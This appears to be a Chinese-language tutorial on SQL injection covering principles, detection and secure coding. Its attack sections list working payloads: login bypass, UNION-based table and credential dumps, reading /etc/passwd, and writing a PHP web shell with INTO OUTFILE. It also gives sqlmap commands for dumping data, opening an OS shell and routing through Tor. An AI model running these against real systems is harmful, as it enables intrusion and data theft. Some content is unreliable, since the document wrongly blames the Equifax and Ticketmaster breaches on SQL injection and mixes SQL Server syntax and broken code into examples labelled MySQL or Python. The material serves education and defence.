# SQL 注入基础与检测 (SQL Injection Basics & Detection)
 False
 False> @Version: v4.0.0
 False> @Module: mysql
 False
 False> @Author: Anonymous
 False> @Category: MySQL Advanced
 False> @Description: SQL 注入概述、原理详解及检测方法。 | SQL Injection overview, principles, and detection methods.
 False
 False***
 False
 False## 目录
 False
 False1. [SQL 注入概述](#sql-注入概述)
 False2. [SQL 注入原理详解](#sql-注入原理详解)
 False3. [SQL 注入检测方法](#sql-注入检测方法)
 False
 False***
 False
 False## 1. SQL 注入概述 (Overview)
 False
 False### 1.1 什么是 SQL 注入
 False
 FalseSQL 注入（SQL Injection）是一种代码注入攻击技术，攻击者通过在应用程序的输入字段中插入恶意 SQL 代码，从而操纵数据库执行非预期的操作。这是 Web 应用程序中最常见、最危险的安全漏洞之一，位列 OWASP Top 10 之首。
 False
 False**核心原理**：
 False
 False- 应用程序将用户输入直接拼接到 SQL 查询语句中
 False- 攻击者利用这种拼接机制注入恶意 SQL 代码
 False- 数据库执行了攻击者构造的恶意查询
 False
 False**历史背景**：
 False
 FalseSQL 注入攻击最早于 1998 年被首次公开报道，当时一名黑客在 Web 应用程序中发现了这一漏洞。此后，SQL 注入成为最常见的 Web 攻击手段之一，给全球无数企业和组织造成了巨大的经济损失和声誉损害。
 False
 False### 1.2 SQL 注入的危害
 False
 FalseSQL 注入可能导致以下严重后果：
 False
 False| 危害类型 | 说明 | 严重程度 |
 False| :--------- | :---------------------- | :--- |
 False| **数据泄露** | 获取敏感数据，如用户密码、个人信息、商业机密等 | 高 |
 False| **数据篡改** | 修改、删除或插入数据库中的数据 | 高 |
 False| **数据破坏** | 删除表、清空数据甚至破坏整个数据库 | 极高 |
 False| **权限提升** | 获取数据库管理员权限，控制服务器 | 极高 |
 False| **远程代码执行** | 在某些情况下执行操作系统命令 | 极高 |
 False| **网站接管** | 完全控制 Web 应用程序 | 高 |
 False| **身份冒充** | 以合法用户身份进行操作 | 高 |
 False| **服务拒绝** | 使数据库服务崩溃或无法正常使用 | 中 |
 False
 False**实际案例**：
 False
 False- 2017 年 Equifax 数据泄露事件：攻击者通过 SQL 注入漏洞获取了 1.43 亿用户的敏感信息
 False- 2018 年 Ticketmaster 数据泄露：超过 40000 名用户的支付信息被窃取
 False- 众多中小企业网站因 SQL 注入导致用户数据库被清空
 False
 False### 1.3 SQL 注入的分类
 False
 FalseSQL 注入可以按照不同的方式分类：
 False
 False#### 1.3.1 按数据获取方式分类
 False
 False- **带内注入（In-band）**：攻击者使用同一通道发送攻击和获取结果，最常见也最容易实施
 False- **盲注（Blind）**：无法直接获取查询结果，通过应用程序的行为推断，布尔盲注和时间盲注
 False- **带外注入（Out-of-band）**：使用不同的通道发送攻击和获取结果，如 DNS 通道
 False
 False#### 1.3.2 按注入位置分类
 False
 False- **GET 参数注入**：通过 URL 参数注入，最常见的注入点
 False- **POST 参数注入**：通过表单数据注入
 False- **Cookie 注入**：通过 Cookie 注入
 False- **HTTP 头注入**：通过 HTTP 请求头（如 User-Agent、X-Forwarded-For）注入
 False- **文件上传注入**：通过文件上传功能注入
 False
 False#### 1.3.3 按数据库类型分类
 False
 False- **MySQL 注入**：最常见的数据库注入
 False- **SQL Server 注入**：通常可利用 xp\_cmdshell 执行系统命令
 False- **Oracle 注入**：可能利用 utl\_http 包进行带外攻击
 False- **PostgreSQL 注入**：可能利用 COPY 命令读写文件
 False
 False## 2. SQL 注入原理详解 (Principle)
 False
 False### 2.1 基本原理示例
 False
 False让我们通过一个简单的登录功能来理解 SQL 注入的原理。
 False
 False#### 2.1.1 危险代码示例
 False
```python
 True# 危险代码：直接拼接用户输入
 Truedef login(username, password):
 True # 直接将用户输入拼接到 SQL 语句中
 True sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
 True cursor.execute(sql)
 True return cursor.fetchone()
 True```

 False**代码分析**：
 False
 False这段代码的问题在于直接将用户输入拼接到 SQL 语句中，没有任何过滤或转义。当用户输入正常的用户名和密码时，查询正常工作。但如果攻击者输入特殊的字符或 SQL 语句，就可以破坏原有查询的逻辑。
 False
 False#### 2.1.2 正常登录
 False
```python
 True# 正常登录
 Truelogin("admin", "123456")
 True# 执行的 SQL：
 True# SELECT * FROM users WHERE username = 'admin' AND password = '123456'
 True```

 False**执行流程**：
 False
 False1. 用户输入用户名 "admin" 和密码 "123456"
 False2. 应用程序构建查询语句
 False3. 数据库执行查询，验证用户凭据
 False4. 返回查询结果
 False
 False#### 2.1.3 SQL 注入攻击
 False
```python
 True# 攻击者使用特殊输入绕过登录
 Truelogin("admin' --", "anything")
 True# 执行的 SQL：
 True# SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
 True# 注释符 -- 后面的内容被忽略，只验证了 username = 'admin'
 True```

 False**攻击原理**：
 False
 False1. 用户名输入 `admin' --`
 False2. 应用程序构建的 SQL 变为：`SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'`
 False3. 单引号闭合了原来的字符串
 False4. `--` 将后面的内容全部注释掉
 False5. 实际执行的查询变为：`SELECT * FROM users WHERE username = 'admin'`
 False6. 如果存在 admin 用户，攻击者即可绕过登录验证
 False
 False### 2.2 SQL 注入的关键点
 False
 FalseSQL 注入成功的关键要素：
 False
 False1. **用户输入可控**：攻击者能够控制输入参数
 False2. **输入未经过滤**：应用程序没有对输入进行验证或转义
 False3. **输入直接拼接**：输入被直接拼接到 SQL 语句中
 False4. **错误信息暴露**：应用程序暴露了详细的数据库错误信息
 False
 False### 2.3 SQL 注入的完整攻击流程
 False
 False#### 2.3.1 信息收集阶段
 False
 False攻击者首先需要收集目标系统的信息：
 False
```sql
 True-- 测试注入点
 True?id=1'
 True?id=1"
 True?id=1 AND 1=1
 True?id=1 AND 1=2
 True
 True-- 获取数据库版本
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 @@version)) --
 True
 True-- 获取当前数据库名
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 database_name FROM information_schema.tables)) --
 True
 True-- 获取用户名
 True?id=1' AND 1=CONVERT(int, (SELECT TOP 1 user_name())) --
 True```

 False#### 2.3.2 数据库枚举阶段
 False
```sql
 True-- MySQL 获取所有数据库
 True?id=1' UNION SELECT 1, schema_name FROM information_schema.schemata --
 True
 True-- 获取当前数据库的所有表
 True?id=1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() --
 True
 True-- 获取表的的所有列
 True?id=1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --
 True
 True-- 获取数据
 True?id=1' UNION SELECT username, password FROM users --
 True```

 False#### 2.3.3 权限提升阶段
 False
```sql
 True-- 检查是否为 DBA（数据库管理员）
 True?id=1' AND 1=(SELECT COUNT(*) FROM mysql.user WHERE Super_priv='Y') --
 True
 True-- 获取 MySQL 用户列表
 True?id=1' UNION SELECT 1, user FROM mysql.user --
 True
 True-- 读取文件（需要 FILE 权限）
 True?id=1' UNION SELECT 1, LOAD_FILE('/etc/passwd') --
 True
 True-- 写入文件
 True?id=1' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
 True```

 False## 3. SQL 注入检测方法 (Detection Methods)
 False
 False### 3.1 手动检测
 False
 False#### 3.1.1 基础测试 Payload
 False
```sql
 True-- 单引号测试
 True'
 True"
 True' OR '1'='1
 True" OR "1"="1
 True' OR 1=1 --
 True" OR 1=1 --
 True' OR 'a'='a
 True" OR "a"="a
 True
 True-- 注释测试
 True' --
 True" --
 True' #
 True" #
 True/* */
 True
 True-- OR 测试
 True' OR 1=1 --
 True' OR '1'='1
 True1' OR '1'='1
 True
 True-- AND 测试
 True' AND 1=1 --
 True' AND 1=2 --
 True1' AND 1=1 --
 True1' AND 1=2 --
 True
 True-- 数字型测试
 True1 AND 1=1
 True1 AND 1=2
 True
 True-- LIKE 测试
 True' LIKE '%
 True%' OR 1=1 --
 True
 True-- IN 测试
 True' IN ('a', 'b') --
 True
 True-- UNION 测试
 True' UNION SELECT NULL --
 True' UNION SELECT 1,2 --
 True' UNION SELECT NULL, NULL --
 True```

 False#### 3.1.2 检测步骤
 False
 False1. **识别输入点**：找出所有用户可控的输入
 False - URL 参数
 False - 表单数据
 False - Cookie
 False - HTTP 头
 False2. **基础测试**：输入单引号、双引号，观察响应
 False - 是否报错
 False - 错误信息是否暴露数据库细节
 False3. **Boolean 测试**：使用 AND 1=1 和 AND 1=2
 False - 两次响应是否不同
 False - 不同说明可能存在注入
 False4. **UNION 测试**：尝试 UNION 查询
 False - 确定列数
 False - 确定显示位置
 False5. **时间测试**：使用 SLEEP() 或 BENCHMARK()
 False - 如果响应延迟，说明存在注入
 False6. **错误测试**：输入可能导致错误的语句
 False - 观察错误信息
 False
 False### 3.2 自动化检测工具
 False
 False#### 3.2.1 SQLMap
 False
 FalseSQLMap 是最流行的自动化 SQL 注入工具。
 False
```bash
 True# 基本用法
 Truesqlmap -u "http://example.com/product.php?id=1"
 True
 True# 测试 POST 请求
 Truesqlmap -u "http://example.com/login.php" --data="username=test&password=test"
 True
 True# 测试 Cookie
 Truesqlmap -u "http://example.com/page.php" --cookie="PHPSESSID=abc123"
 True
 True# 获取数据库
 Truesqlmap -u "http://example.com/product.php?id=1" --dbs
 True
 True# 获取表
 Truesqlmap -u "http://example.com/product.php?id=1" -D database_name --tables
 True
 True# 获取列
 Truesqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name --columns
 True
 True# 获取数据
 Truesqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name -C column1,column2 --dump
 True
 True# 获取 Shell
 Truesqlmap -u "http://example.com/product.php?id=1" --os-shell
 True
 True# 执行自定义 SQL
 Truesqlmap -u "http://example.com/product.php?id=1" --sql-query="SELECT * FROM users"
 True
 True# 批量测试
 Truesqlmap -m urls.txt
 True
 True# 使用 Tor 匿名网络
 Truesqlmap -u "http://example.com/product.php?id=1" --tor --tor-type=SOCKS5
 True```

 False#### 3.2.2 Burp Suite
 False
```bash
 True# 使用 Burp Suite 的 Intruder 模块
 True# 1. 拦截请求
 True# 2. 发送到 Intruder
 True# 3. 设置 Payload
 True# 4. 加载 SQL 注入 Payload 列表
 True# 5. 分析响应
 True```

 False#### 3.2.3 其他工具
 False
 False- **OWASP ZAP**：开源的 Web 应用安全扫描器
 False- **Havij**：图形化的 SQL 注入工具（仅支持 MySQL）
 False- **Sqlninja**：专门针对 SQL Server 的注入工具
 False- **NoSQLMap**：针对 NoSQL 数据库的注入工具
 False
 False### 3.3 代码审计检测
 False
 False#### 3.3.1 危险代码模式
 False
```python
 True# 危险模式 1：直接字符串拼接（f-string）
 Truesql = f"SELECT * FROM users WHERE id = {user_id}"
 True
 True# 危险模式 2：字符串拼接（+）
 Truesql = "SELECT * FROM users WHERE id = " + user_id
 True
 True# 危险模式 3：使用 % 格式化
 Truesql = "SELECT * FROM users WHERE id = %s" % user_id
 True
 True# 危险模式 4：使用 format()
 Truesql = "SELECT * FROM users WHERE id = {}".format(user_id)
 True
 True# 危险模式 5：没有参数化的存储过程调用
 Truecursor.callproc("get_user", (user_id,)) -- 取决于存储过程实现
 True```

 False#### 3.3.2 安全代码模式
 False
```python
 True# 安全模式 1：参数化查询
 Truesql = "SELECT * FROM users WHERE id = %s"
 Truecursor.execute(sql, (user_id,))
 True
 True# 安全模式 2：ORM 查询
 Trueuser = session.query(User).filter(User.id == user_id).first()
 True
 True# 安全模式 3：使用 SQLAlchemy
 Trueresult = conn.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
 True```

 False#### 3.3.3 PHP 代码审计
 False
```php
 True// 危险代码
 True$sql = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
 True$result = mysqli_query($conn, $sql);
 True
 True// 安全代码
 True$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
 True$stmt->bind_param("s", $_POST['username']);
 True$stmt->execute();
 True```

 False---
 False
 False### 更新日志 (Changelog)
 False
 False- 2026-05-27: 拆分为独立文件，添加元数据，版本升级至 v4.0.0
 False- 2026-05-03: 创建 SQL 注入安全防御文档
 False